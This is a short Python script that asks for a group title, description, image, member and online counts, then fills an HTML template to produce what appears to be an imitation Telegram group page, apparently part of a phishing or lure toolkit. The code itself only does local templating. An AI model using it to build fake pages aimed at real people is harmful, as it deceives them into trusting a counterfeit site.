#!/usr/bin/env python3

import os
import shutil
import quo

quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
quo.echo(f"Group Title", fg="vcyan", nl=False)
title = quo.prompt("")

quo.echo(f"[>>]", fg="vyellow", bold=True, nl=False)
quo.echo(f" Group Description", fg="vcyan", nl=False)
desc = quo.prompt("")

quo.echo(f"[>>]", fg="vyellow", nl=False, bold=True)
quo.echo(f" Image Path ", fg="vcyan", nl=False)
quo.echo(f"(Ideal image size : 300x300 )", fg="vred", nl=False)
image = quo.prompt("")

quo.echo(f"[>>]", fg="vgreen", nl=False, bold=True)
quo.echo(f" Number of Members", fg="vcyan", nl=False)
mem_num = quo.prompt("")

quo.echo(f"[>>]", fg="vgreen", bold=True, nl=False)
quo.echo(f" Number of members online", fg="vcyan", nl=False)
online_num = quo.prompt("")

img_name = image.split('/')[-1]

try:
    shutil.copyfile(image, 'template/telegram/images/{}'.format(img_name))

except Exception as e:
    print('\n' + '[-]' + ' Exception : ' + str(e))
    exit()

with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)
